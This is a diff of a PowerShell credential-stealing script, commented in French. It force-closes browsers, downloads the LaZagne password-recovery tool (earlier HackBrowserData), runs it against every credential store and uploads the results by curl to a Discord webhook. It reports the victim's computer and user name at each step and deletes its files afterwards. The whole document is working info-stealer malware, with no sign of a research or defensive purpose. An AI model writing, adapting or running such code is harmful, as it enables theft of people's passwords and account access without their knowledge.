@@ -11,80 +11,51 @@ function Send-Discord {
 Send-Discord "🟢 **START** - PC: $env:COMPUTERNAME | User: $env:USERNAME"
 
 # Tuer navigateurs
-@("chrome","msedge","firefox","brave","opera","vivaldi") | ForEach-Object {
+@("chrome","msedge","firefox","brave","opera") | ForEach-Object {
     Get-Process -Name $_ -EA 0 | Stop-Process -Force -EA 0
 }
 
-Start-Sleep 5
+Start-Sleep 3
 
 Set-Location $env:TEMP
-Remove-Item hbd.zip,HBD,results.zip -Recurse -Force -EA 0
+Remove-Item lazagne.exe,passwords.txt -Force -EA 0
 
-Send-Discord "📥 **Downloading HackBrowserData...**"
+Send-Discord "📥 **Downloading LaZagne...**"
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     
-    # NOUVELLE URL - Version la plus récente
-    $url = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.7/hack-browser-data-v0.4.7-windows-amd64.zip"
+    # Télécharger LaZagne (outil Python compilé)
+    Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe" -OutFile "lazagne.exe" -UseBasicParsing
     
-    Invoke-WebRequest -Uri $url -OutFile "hbd.zip" -UseBasicParsing
-    
-    if (!(Test-Path "hbd.zip")) {
-        Send-Discord "❌ **Download failed - file not created**"
+    if (!(Test-Path "lazagne.exe")) {
+        Send-Discord "❌ **Download failed**"
         exit
     }
     
-    $fileSize = (Get-Item "hbd.zip").Length
-    Send-Discord "✅ **Downloaded** - Size: $([math]::Round($fileSize/1KB,2)) KB"
+    Send-Discord "🔓 **Extracting all passwords...**"
     
-    Send-Discord "📦 **Extracting...**"
-    Expand-Archive -Path "hbd.zip" -DestinationPath "HBD" -Force
+    # Exécuter LaZagne
+    .\lazagne.exe all -oN passwords.txt
     
-    Set-Location "HBD"
+    Start-Sleep 2
     
-    if (!(Test-Path "hack-browser-data.exe")) {
-        Send-Discord "❌ **EXE not found after extraction**"
-        exit
-    }
-    
-    Send-Discord "🔓 **Extracting browser data...**"
-    
-    Start-Process -FilePath ".\hack-browser-data.exe" -ArgumentList "--browser all --format json --dir output --zip" -Wait -NoNewWindow
-    
-    Start-Sleep 3
-    
-    if (Test-Path "results.zip") {
-        $size = [math]::Round((Get-Item "results.zip").Length / 1KB, 2)
-        Send-Discord "📤 **Uploading $size KB...**"
+    if (Test-Path "passwords.txt") {
+        $size = [math]::Round((Get-Item "passwords.txt").Length / 1KB, 2)
+        Send-Discord "📤 **Uploading results ($size KB)...**"
         
         $date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
-        curl.exe -F "file=@results.zip" -F "content=✅ **DATA EXTRACTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Size:** $size KB`n**Date:** $date" $wh
+        curl.exe -F "file=@passwords.txt" -F "content=🔑 **ALL PASSWORDS EXTRACTED**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Size:** $size KB`n**Date:** $date" $wh
         
         Send-Discord "✅ **Upload SUCCESS**"
-    }
-    elseif (Test-Path "output") {
-        Send-Discord "⚠️ **Creating manual archive...**"
-        
-        Compress-Archive -Path "output\*" -DestinationPath "manual.zip" -Force
-        
-        if (Test-Path "manual.zip") {
-            $size = [math]::Round((Get-Item "manual.zip").Length / 1KB, 2)
-            curl.exe -F "file=@manual.zip" -F "content=📁 **Fallback data ($size KB)**" $wh
-            Send-Discord "✅ **Manual upload done**"
-        }
-    }
-    else {
-        Send-Discord "❌ **No output created**"
+    } else {
+        Send-Discord "❌ **No output file created**"
     }
     
 } catch {
-    $err = $_.Exception.Message -replace '"',"'" 
+    $err = $_.Exception.Message
     Send-Discord "❌ **Error:** $err"
 }
 
-Set-Location ..
-Start-Sleep 2
-Remove-Item hbd.zip,HBD -Recurse -Force -EA 0
-
+Remove-Item lazagne.exe,passwords.txt -Force -EA 0
 Send-Discord "🧹 **FINISHED**"
